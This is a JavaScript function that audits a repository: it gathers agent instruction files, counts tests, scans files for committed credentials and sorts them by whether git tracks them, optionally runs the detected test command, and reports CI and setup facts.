export async function harvestRepo(repo, { kitRoot, runTestSuite = true, testTimeoutMs = 120000 } = {}) {
  if (!existsSync(repo)) {
    return { source: source.notHarvested('repository path does not exist: ' + repo) };
  }

  // One shared budget so the excerpts across every file stay bounded in total, not just
  // per file.
  const excerptBudget = { remaining: HARNESS_EXCERPT_TOTAL_CHARS };
  const harnessFiles = HARNESS_FILES.map((rel) => describeHarnessFile(repo, rel, kitRoot, excerptBudget));
  const instructionsDir = join(repo, '.github', 'instructions');
  const instructionFiles = existsSync(instructionsDir)
    ? readdirSync(instructionsDir).filter((f) => f.endsWith('.md')).map((f) => describeHarnessFile(repo, '.github/instructions/' + f, kitRoot, excerptBudget))
    : [];

  const contextDocs = CONTEXT_DOCS.map((rel) => describeHarnessFile(repo, rel, kitRoot, excerptBudget));

  const secrets = excerptCollector(10);
  const localCredentials = excerptCollector(10);
  // Null when this is not a git repo or git is missing, in which case every file is
  // scanned — reporting a clean repo because we could not read the index would be worse
  // than over-reporting. See trackedFiles.
  const tracked = trackedFiles(repo);
  const untracked = excerptCollector(10);
  const testFiles = [];
  let sourceFiles = 0;
  // .NET has no root lockfile: a PackageReference carries its exact version in the
  // project file, so finding one anywhere in the tree is the same evidence pom.xml is.
  let dotnetProject = false;
  let filesScanned = 0;
  const walkResult = walk(repo, (full) => {
    filesScanned++;
    const rel = relative(repo, full);
    if (isTestPath(rel)) testFiles.push(rel);
    else if (CODE_EXTENSIONS.has(extname(full).toLowerCase())) sourceFiles++;
    if (DOTNET_PROJECT.test(rel)) dotnetProject = true;
    if (!TEXT_EXTENSIONS.has(extname(full).toLowerCase())) return;
    const content = readIfText(full, 256 * 1024);
    if (content === null) return;
    const lines = content.split('\n');
    for (let i = 0; i < lines.length; i++) {
      for (const pattern of SECRET_PATTERNS) {
        const match = lines[i].match(pattern.re);
        if (!match) continue;
        // Nothing was leaked and there is nothing to tell the team, so this is not
        // reported at all — unlike a local credential, which is reported but not scored.
        // `continue`, not `break`: a line can hold a templated connection string *and* a
        // real assigned credential, and breaking here reported neither.
        if (!pattern.alwaysReal && INTERPOLATED.test(match[0])) continue;
        const where = pattern.name + ' at ' + rel + ':' + (i + 1);
        const meta = { rule: pattern.name, file: rel, line: i + 1 };
        // Three collectors, not one flag, so a consumer cannot accidentally count a
        // localhost dev password or an untracked file as a leak by reading the wrong field.
        const rest = lines[i].slice(match.index + match[0].length);
        // An untracked file was never committed, so nothing about it is in git history and
        // there is nothing to rotate on our say-so. Still recorded, because a credential
        // sitting in the working tree is worth a team knowing about.
        if (tracked && !tracked.has(rel)) untracked.offer(where, meta);
        else if (isLocalOnlyCredential(pattern, rest, rel)) localCredentials.offer(where, meta);
        else secrets.offer(where, meta);
        break;
      }
    }
  });

  const commands = detectCommands(repo);
  // A root `docker-compose.yml` is how most teams make a project runnable from a fresh
  // clone. Checking only `.devcontainer` and `Dockerfile` missed it, and cost a repo that
  // shipped one the "setup works from a fresh clone" points.
  const containerFile = CONTAINER_FILES.find((f) => existsSync(join(repo, f))) ?? null;
  const gitignore = readIfText(join(repo, '.gitignore')) ?? '';
  const workflowsDir = join(repo, '.github', 'workflows');
  const workflows = existsSync(workflowsDir)
    ? readdirSync(workflowsDir).filter((f) => /\.ya?ml$/.test(f))
    : [];

  let testRun = { ran: false, reason: 'skipped by flag' };
  if (runTestSuite && commands.test) {
    testRun = await runTests(repo, commands.test, testTimeoutMs);
    testRun.command = commands.test;
  } else if (runTestSuite) {
    testRun = { ran: false, reason: 'no test command detected' };
  }

  return {
    source: source.harvested({ filesScanned, truncated: walkResult.truncated }),
    harnessFiles,
    instructionFiles,
    contextDocs,
    commands,
    tests: {
      testFileCount: testFiles.length,
      // What the test count is proportionate to. Reported, never judged here.
      sourceFileCount: sourceFiles,
      sample: testFiles.slice(0, 10),
      run: testRun,
    },
    ci: {
      workflowCount: workflows.length,
      workflows,
    },
    safety: {
      secretFindings: secrets.result(),
      // Reported so a team knows the scanner saw them, but deliberately kept out of
      // `secretFindings` so nothing can score them. See isLocalOnlyCredential.
      localCredentials: localCredentials.result(),
      // Matches in files git does not track. Never scored: see trackedFiles.
      untrackedCredentials: untracked.result(),
      trackedFileCount: tracked ? tracked.size : null,
      envFilePresent: existsSync(join(repo, '.env')),
      envExamplePresent: existsSync(join(repo, '.env.example')),
      gitignoreCoversEnv: gitignoreCoversEnvFile(gitignore),
      gitignorePresent: gitignore.length > 0,
      claudeSettingsPresent: existsSync(join(repo, '.claude', 'settings.json'))
        || existsSync(join(repo, '.claude', 'settings.local.json')),
    },
    reproducibility: {
      readmePresent: existsSync(join(repo, 'README.md')),
      readmeBytes: existsSync(join(repo, 'README.md'))
        ? Buffer.byteLength(readIfText(join(repo, 'README.md')) ?? '', 'utf8') : 0,
      setupCommand: commands.setup ?? null,
      runCommand: commands.dev ?? commands.start ?? null,
      lockfilePresent: LOCKFILES.some((f) => existsSync(join(repo, f))) || dotnetProject,
      containerised: containerFile !== null,
      containerFile,
      setupCommandSource: commands.setupSource ?? null,
      runCommandSource: commands.devSource ?? commands.startSource ?? null,
    },
  };
}
